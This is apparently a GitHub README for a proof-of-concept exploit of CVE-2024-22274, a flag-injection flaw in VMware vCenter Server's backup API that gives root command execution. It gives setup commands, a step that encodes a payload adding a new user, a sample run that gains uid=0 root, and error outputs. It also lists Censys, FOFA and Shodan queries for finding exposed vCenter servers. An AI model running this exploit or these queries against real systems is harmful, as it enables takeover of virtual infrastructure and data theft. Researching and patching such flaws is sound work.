<h1 align="center">
    Privilege Escalation: VMware vCenter Server Authenticated RCE
</h2>

<p align="center">
    <a href="https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2FCVE-2024-22274-RCE">
    <img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2FCVE-2024-22274-RCE&label=Visitors&countColor=%2337d67a" />
    </a>
    <a href="https://www.facebook.com/l0n3m4n">
        <img src="https://img.shields.io/badge/Facebook-%231877F2.svg?style=for-the-badge&logo=Facebook&logoColor=white" alt="Facebook">
    </a>
      <a href="https://www.twitter.com/l0n3m4n">
        <img src="https://img.shields.io/badge/Twitter-%23000000.svg?style=for-the-badge&logo=X&logoColor=white" alt="X">
    </a>
    <a href="https://medium.com/@l0n3m4n">
        <img src="https://img.shields.io/badge/Medium-12100E?style=for-the-badge&logo=medium&logoColor=white" alt="Medium">
    </a>
    <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54" alt="Python">
    </a>
    <a href="https://www.kali.org/">
    <img src="https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white" alt="Kali">      
    </a>
</p>

## 📜 Description 

The “com.vmware.appliance.recovery.backup.job.create” and the
“com.vmware.appliance.recovery.backup.validate” API components are vulnerable to a flag
injection attack that can be leveraged to execute arbitrary commands as the root user on
the target system."

## 📚 Table of Contents
- 📜 [Description](#-description)
- 🛠️ [Installation](#-installation)
- ⚙️ [Usage](#-usage)
- 🔎 [Discovery](#-discovery)
- 📝 [Notes](#notes)
- 💁 [References](#-references)
- 📢 [Disclaimer](#disclaimer)
  
## 🛠️ Installation and Configuration 
> [!NOTE]
> To work with this PoC exploit, you must have valid credentials and log in to the VMware vCenter Server shell via SSH. The user must have the "admin" role, as specified in the `vcenter_creds.txt` file.
```bash
$ git clone https://github.com/l0n3m4n/CVE-2024-22274-RCE.git
$ cd CVE-2024-22274-RCE 
$ python3 -m venv venv && source venv/bin/activate
$ pip install -r requirements.txt 
```
> Run or modify `user2base64.sh` to  encode the newuser added into base64 and it automatically create `payload.txt`
```bash

$ bash user2base64.sh
Payload has been encoded to base64, saved payload.txt                                 
```

## ⚙️ Usage
![VMware-vCenter](/assets/VMware-vCenter.png)

### Vulnerable Version
![vulnerable-version](/assets/vulnerable-version.png)
### Successful Execution and Exploitation
```bash
$ python3 CVE-2024-22274-RCE.py -t 192.168.56.103 -P 22 -p payload.txt -c vCenter_creds.txt
 ___ ___ _______                                          ______               __              
|   |   |   |   |.--.--.--.---.-.----.-----.______.--.--.|      |.-----.-----.|  |_.-----.----.
|   |   |       ||  |  |  |  _  |   _|  -__|______|  |  ||   ---||  -__|     ||   _|  -__|   _|
 \_____/|__|_|__||________|___._|__| |_____|       \___/ |______||_____|__|__||____|_____|__|  
    
                Author: l0n3m4n | vCenter RCE: CVE-2024-22274 | PoC: @mbadanoiu
                                                                              
[+] Connected to 192.168.56.103 via SSH
[+] Payload executed successfully. Output: 
   uid=0(root) gid=0(root) groups=0(root)

[+] Exploitation successful: You have root access.
[+] Finished executing commands on 192.168.56.103

```
### Successful Execution but No Root Access
> This example means your getting connected but the payload not correctly configured or loaded. [Refer to PDF PoC](/assets/VMware-vCenter.pdf) for more detailed infomation.
```bash
 ___ ___ _______                                          ______               __              
|   |   |   |   |.--.--.--.---.-.----.-----.______.--.--.|      |.-----.-----.|  |_.-----.----.
|   |   |       ||  |  |  |  _  |   _|  -__|______|  |  ||   ---||  -__|     ||   _|  -__|   _|
 \_____/|__|_|__||________|___._|__| |_____|       \___/ |______||_____|__|__||____|_____|__|  
    
                Author: l0n3m4n | vCenter RCE: CVE-2024-22274 | PoC: @mbadanoiu
                                                                              
[+] Connected to 192.168.56.103 via SSH
[+] Payload executed successfully. Output: 
   No privileges escalation detected.

[+] Exploitation failed: Root access not obtained.
[+] Finished executing commands on 192.168.56.103
```
### Missing Username or Password in Configuration File
```bash
 ___ ___ _______                                          ______               __              
|   |   |   |   |.--.--.--.---.-.----.-----.______.--.--.|      |.-----.-----.|  |_.-----.----.
|   |   |       ||  |  |  |  _  |   _|  -__|______|  |  ||   ---||  -__|     ||   _|  -__|   _|
 \_____/|__|_|__||________|___._|__| |_____|       \___/ |______||_____|__|__||____|_____|__|  
    
                Author: l0n3m4n | vCenter RCE: CVE-2024-22274 | PoC: @mbadanoiu
                                                                              
[-] Error: Username or password not found in configuration file.
```
### Connection Failure or SSH Error
> Please check the host address and credentials.
```bash
 ___ ___ _______                                          ______               __              
|   |   |   |   |.--.--.--.---.-.----.-----.______.--.--.|      |.-----.-----.|  |_.-----.----.
|   |   |       ||  |  |  |  _  |   _|  -__|______|  |  ||   ---||  -__|     ||   _|  -__|   _|
 \_____/|__|_|__||________|___._|__| |_____|       \___/ |______||_____|__|__||____|_____|__|  
    
                Author: l0n3m4n | vCenter RCE: CVE-2024-22274 | PoC: @mbadanoiu
                                                                              
[-] Error: [SSH Error] Connection to 192.168.56.103 failed.
```
## 🔎 Discovery 
- **CENSYS**: `"VMware vCenter"`, **Filter**: `services.port: 443 AND tags: "VMware"`
- **FOFA**: `title="VMware vCenter"`, **Filter**: `port="443" && title="VMware vCenter"`
- **SHODAN**: `"VMware vCenter"`, **Filter**: `port:443 "VMware vCenter"`

## 📝 Notes
This exploit PoC won’t be effective if you don’t understand how to interpret the script, as it has been intentionally altered to prevent "script kiddies"  from simply copying and running it without comprehension. VMware vCenter Server is a critical component in managing virtualized environments, if someone access to it they can gain a full control over the virtual infrastructure and exfiltrate sensitive data. this PoC is designed for those already have small technical expertise to use it correctly, so if you’re script kiddies aiming to cause disruption without understanding the implications this exploit won’t be useful for you.

## 💁 References
- http://www.vmware.com/security/advisories
- https://nvd.nist.gov/vuln/detail/CVE-2024-22274
- https://www.cnnvd.org.cn/home/globalSearch?keyword=CNNVD-202405-4049
- https://bdu.fstec.ru/vul/2024-05108
- https://github.com/advisories/GHSA-xm44-79f8-q8r7
  
## 📢 Disclaimer
This tool is provided for educational and research purposes only. The creator assumes no responsibility for any misuse or damage caused by the tool. [create issue](https://github.com/l0n3m4n/CVE-2024-22274-RCE/issues)

